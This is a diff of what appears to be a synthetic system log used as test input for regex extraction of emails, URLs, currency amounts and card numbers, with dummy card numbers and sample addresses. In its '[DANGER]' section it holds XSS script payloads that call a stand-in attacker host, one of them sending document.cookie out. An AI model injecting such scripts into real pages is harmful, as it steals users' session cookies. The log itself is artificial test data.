@@ -1,31 +1,39 @@
---- SYSTEM LOG START: 2026-02-12 ---
+--- SYSTEM LOG START: 2026-01-30 ---
 [DEBUG] Transaction initiated by user 'ced_h' (IP: 192.168.1.45). 
 Payment of $1,250.00 processed via card 4532 9812 0098 4432 at 14:30.
 Status: Success. Notification sent to: c.havugiman@alustudent.com.
 
+[LOCAL-OFFICE] Rwanda Regional Update:
+- Monthly office rent: 2,500,000 RWF
+- Electricity bill: 45000 RWF (Unpaid)
+- Maintenance fee: 15,200.50 RWF
+- Contact local accounting at rw-finance@alu.edu
+
 [WARN] Incoming data from external-gateway-04 contains unparsed HTML:
 <div class="user-profile">
     <img src="https://avatars.service.com/u/99">
-    <p>User feedback: "Great service! Contact me at feedback.2024@gmail.co.uk if needed."</p>
+    <p>User feedback: "Great service! I spent €120.00 on the premium plan. Contact me at feedback.2024@gmail.co.uk."</p>
 </div>
 
-[DANGER] Possible XSS Injection detected in 'comments' field:
-Input: "<script>fetch('https://malicious-hacker.net/steal?cookie='+document.cookie)</script>"
-Action: Flagged but passed to validator.
+[DANGER] Possible XSS Injection detected:
+Input: "<script>fetch('https://malicious-hacker.net/steal?total=5000GBP')</script>"
+Action: Flagged. 
 
-[INFO] Bulk update from regional office:
-- Refund issued for $45.99 (Order #992)
+[INFO] Europe/UK Bulk Update:
+- Refund issued for £45.99 (Order #992)
 - New vendor URL: https://supply-chain.africa/portal/login
-- Secondary contact: support@tech-hub.net (Do not use admin@old-site.org)
+- Secondary contact: support@tech-hub.net
+- Global licensing fee: 1200 EUR 
 - Backup credit card on file: 1234-5678-9012-3456 (MasterCard)
 
-[ERROR] Malformed line: 
-"Price was 100 dollars and 50 cents" (No symbol, should be ignored)
-"My email is user@@@double-at.com" (Invalid email, should be ignored)
-"Check http://insecure.site/test" (HTTP is allowed, but maybe flag for security)
+[ERROR] Malformed lines (Should be ignored by Regex):
+"I owe you fifty dollars" (No symbol/code)
+"Price is RWF-500" (Incorrect separator)
+"My email is user@@@double-at.com" (Invalid format)
 
 [DATA] Legacy transaction dump:
 ID: 882 | $12,400.00 | 5544-3322-1100-9988 | Validated: True
-ID: 883 | $0.50 | 0000 0000 0000 0000 | Validated: False
+ID: 883 | 0.50 USD | 0000 0000 0000 0000 | Validated: False
+ID: 884 | €1,000,000.00 | 1111-2222-3333-4444 | High Value Alert
 
 --- SYSTEM LOG END ---
